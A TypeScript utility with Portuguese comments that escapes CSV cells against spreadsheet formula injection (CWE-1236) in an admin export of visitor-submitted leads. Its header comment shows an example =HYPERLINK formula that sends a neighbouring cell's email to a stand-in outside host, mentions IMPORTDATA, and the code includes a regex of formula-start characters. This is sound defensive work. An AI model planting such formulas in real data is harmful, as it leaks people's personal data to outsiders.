/**
 * Uma célula de CSV, escrita de forma que a planilha a leia como TEXTO.
 *
 * ┌───────────────────────────────────────────────────────────────────────┐
 * │  POR QUE ASPAS NÃO BASTAM                                             │
 * │                                                                       │
 * │  O CSV do /admin é montado com dados que QUALQUER VISITANTE escreve:  │
 * │  as regras do Firestore deixam criar em `waitlist` e `leads` sem      │
 * │  login nenhum — é o que faz o formulário funcionar para quem chega    │
 * │  pela primeira vez. O campo `name` aceita cem caracteres livres.      │
 * │                                                                       │
 * │  Excel, LibreOffice e Google Sheets não tratam a célula como texto:   │
 * │  se o conteúdo começa com `=`, `+`, `-` ou `@`, eles a interpretam    │
 * │  como FÓRMULA — inclusive dentro das aspas, que só delimitam o campo  │
 * │  no arquivo e somem na importação. Um cadastro com o nome            │
 * │                                                                       │
 * │    =HYPERLINK("https://sitedele.com/?x="&A2;"Clique")                 │
 * │                                                                       │
 * │  vira um link clicável na planilha do instituto, montado com o        │
 * │  e-mail da linha ao lado. O `=IMPORTDATA` do Sheets vai além: busca   │
 * │  um endereço externo sozinho, no instante em que a planilha abre.     │
 * │  É a lista de leads — dado pessoal sob a LGPD — saindo pela porta da  │
 * │  frente, sem que nada no site tenha sido invadido.                    │
 * │                                                                       │
 * │  Isto é CWE-1236, "Improper Neutralization of Formula Elements in a   │
 * │  CSV File". A correção é do lado de QUEM ESCREVE o arquivo: o site    │
 * │  não controla em que programa o CSV vai ser aberto.                   │
 * └───────────────────────────────────────────────────────────────────────┘
 *
 * Duas defesas, nesta ordem:
 *
 * 1. uma apóstrofe na frente do valor perigoso. É a convenção que as três
 *    planilhas entendem como "o que vem depois é texto"; ela é consumida na
 *    importação e não aparece na célula;
 * 2. as aspas de sempre, com as internas duplicadas, que é o que impede uma
 *    aspa, uma vírgula ou uma quebra de linha de partir a coluna.
 */

/**
 * Os caracteres que iniciam fórmula, e os que a planilha DESCARTA antes de
 * olhar para o primeiro caractere.
 *
 * Tabulação, retorno de carro e quebra de linha entram na lista porque são
 * ignorados na leitura: `\t=cmd` chega à planilha como `=cmd`. Sem eles, a
 * defesa cai com um espaço em branco na frente.
 */
const PERIGOSOS = /^[=+\-@\t\r\n]/;

/** Prepara um valor para virar célula: neutraliza a fórmula e põe as aspas. */
export function celulaCsv(valor: unknown): string {
  const texto = String(valor ?? '');
  const seguro = PERIGOSOS.test(texto) ? `'${texto}` : texto;
  return `"${seguro.replace(/"/g, '""')}"`;
}

/** Uma linha inteira, célula por célula. */
export function linhaCsv(valores: readonly unknown[]): string {
  return valores.map(celulaCsv).join(',');
}
